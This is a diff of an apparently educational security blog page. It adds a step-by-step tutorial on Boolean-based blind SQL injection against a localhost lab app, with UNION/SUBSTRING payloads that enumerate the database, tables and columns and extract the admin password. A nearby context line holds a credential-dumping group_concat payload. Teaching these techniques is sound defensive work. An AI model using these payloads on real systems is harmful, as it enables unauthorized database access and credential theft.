@@ -1134,11 +1134,272 @@ WHERE table_name = 'staff_users'</code></p>
 <p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;')
 FROM staff_users</code></p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LItM8RdUP1gRaWo0JLmL2A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*LItM8RdUP1gRaWo0JLmL2A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
 
 <p>We’ve got usernames and hashed passwords on separate lines. Mission success.</p>
 
 <p>Always remember: SQLi like this happens because of <strong>poor input sanitization</strong> and <strong>unsafely constructed SQL queries</strong>. Use parameterized queries (prepared statements) to shut this down.</p>
+
+<h1 id="boolean-based-blind-sql-injection-sqli">Boolean-Based Blind SQL Injection (SQLi)</h1>
+<hr />
+
+<p>Boolean-Based SQL Injection is a form of <strong>blind injection</strong> where the attacker doesn’t see database output directly but instead infers it through differences in the application’s behavior. The application’s response is based on <strong>true/false conditions</strong>, allowing attackers to slowly extract data.</p>
+
+<p>For example, a page might respond with “user found” when a condition is true, and “no user found” when false. That boolean switch is what we exploit.</p>
+
+<hr />
+
+<h3 id="scenario">Scenario</h3>
+
+<p>Imagine a web app that checks if a username exists:</p>
+
+<ul>
+  <li>
+    <p>✅ <code class="language-plaintext highlighter-rouge">http://localhost:8080/user.php?id=admin</code> → Response: <strong>user found</strong></p>
+  </li>
+  <li>
+    <p>❌ <code class="language-plaintext highlighter-rouge">http://localhost:8080/user.php?id=admin123</code> → Response: <strong>no user found</strong></p>
+  </li>
+</ul>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*YH6CTN8OYgKsnLaPMMjPhg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*mSO5iQu8gQOl4Hwq-YLCwg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>This tells us that <code class="language-plaintext highlighter-rouge">admin</code> is a valid username. Now let’s exploit this vulnerability using SQL Injection techniques.</p>
+
+<hr />
+
+<h3 id="step-1-identifying-column-count-with-union-select">Step 1: Identifying Column Count with <code class="language-plaintext highlighter-rouge">UNION SELECT</code></h3>
+
+<p>To execute a <code class="language-plaintext highlighter-rouge">UNION</code>-based injection, we must match the number of columns in the original query. We incrementally test:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+
+-   ❌ `admin123' UNION SELECT 'col1'-- -`
+
+-   ❌ `admin123' UNION SELECT 'col1','col2'-- -`
+
+-   ✅ `admin123' UNION SELECT 'col1','col2','col3'-- -`
+
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Ro3NT8z7UfqndfN4L1Z55Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Once we see “user found”, the column count (3) is confirmed.</p>
+
+<hr />
+
+<h3 id="step-2-enumerating-the-database-name">Step 2: Enumerating the Database Name</h3>
+
+<p>You can extract the database name using the <code class="language-plaintext highlighter-rouge">database()</code> function:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+admin123' UNION SELECT database(), 'x', 'x'-- - 
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKF5355haB2CJi6qlMWQ4Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>But in a true blind context, we need to guess characters one-by-one using <code class="language-plaintext highlighter-rouge">SUBSTRING()</code>:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+admin123' UNION SELECT 'x', 'x', 'x' FROM dual WHERE SUBSTRING(database(),1,1)='b'-- - 
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*0rSJ32MTMbvUlGChliiwkg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>If the result is “user found”, then the first character is ‘b’.</p>
+
+<p>You continue checking each character position:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 2) = 'bl'</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 3) = 'bli'</code></p>
+
+<p>Until you reach:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 10) = 'blind_sqli'</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*kU0xgyiEpqt904-S9T8S8Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Now we know the database is called <code class="language-plaintext highlighter-rouge">blind_sqli</code>.</p>
+
+<hr />
+
+<h3 id="step-3-enumerating-table-names">Step 3: Enumerating Table Names</h3>
+
+<p>We use <code class="language-plaintext highlighter-rouge">information_schema.tables</code> to get table names in this DB:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+admin123' UNION SELECT 'x','x','x' FROM information_schema.tables WHERE table_schema = 'blind_sqli' AND SUBSTRING(table_name,1,1)='u' LIMIT 0,1 -- - 
+</code></pre>
+</div>
+
+<p>Continue guessing until:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SUBSTRING(table_name,1,5)='users'</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a0r7lQJJkzmy76EUf2Td8w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Confirmed: The table is <code class="language-plaintext highlighter-rouge">users</code>.</p>
+
+<hr />
+
+<h3 id="step-4-enumerating-column-names">Step 4: Enumerating Column Names</h3>
+
+<p>We now use <code class="language-plaintext highlighter-rouge">information_schema.columns</code>:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+admin123' UNION SELECT 'x','x','x' FROM information_schema.columns WHERE table_schema = 'blind_sqli' AND table_name = 'users' AND SUBSTRING(column_name, 1, 1) = 'u' LIMIT 0, 1 -- - 
+</code></pre>
+</div>
+
+<p>Repeat until you find:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SUBSTRING(column_name, 1, 8) = 'username'</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">SUBSTRING(column_name, 1, 8) = 'password'</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lyL7fBKOX2qtjAXrCzOCwA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*g33Y_aXEDHQ5TrT__57u0A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Columns are: <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code>.</p>
+
+<hr />
+
+<h3 id="step-5-enumerating-usernames-from-the-users-table">Step 5: Enumerating Usernames from the <code class="language-plaintext highlighter-rouge">users</code> Table</h3>
+
+<p>Now that you know the structure, time to exfil actual data:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(username,1,1)='a' LIMIT 0,1 -- -
+</code></pre>
+</div>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(username,1,1)='j' LIMIT 0,1 -- -
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*KkSEyWOPGjrXEvLA3YFFrA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Keep testing until you identify the value:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SUBSTRING(username, 1, 5) = 'admin'</code></p>
+
+<p>Confirmed user: <code class="language-plaintext highlighter-rouge">admin</code></p>
+
+<hr />
+
+<h3 id="step-6-enumerating-the-password">Step 6: Enumerating the Password</h3>
+
+<p>Same technique applies for <code class="language-plaintext highlighter-rouge">password</code> field:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(password, 1, 3) = 'sup' LIMIT 0, 1 -- -
+</code></pre>
+</div>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(password, 1, 11) = 'supersecret' LIMIT 0, 1 -- -
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*bNxBMnzgAWSV2UdQUtzj_A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Confirmed password: <code class="language-plaintext highlighter-rouge">supersecret</code></p>
+
+<hr />
+
+<p>This process may seem slow, but it works even when there’s no error message or visible output only behavior changes. Boolean-based blind SQLi depends on:</p>
+
+<ul>
+  <li>
+    <p>Controlled injection point (like <code class="language-plaintext highlighter-rouge">id=</code> parameter)</p>
+  </li>
+  <li>
+    <p>Application responses that clearly reflect true vs false outcomes</p>
+  </li>
+  <li>
+    <p>Use of functions like <code class="language-plaintext highlighter-rouge">SUBSTRING()</code>, <code class="language-plaintext highlighter-rouge">database()</code>, <code class="language-plaintext highlighter-rouge">information_schema</code></p>
+  </li>
+</ul>
 
     </section>
 
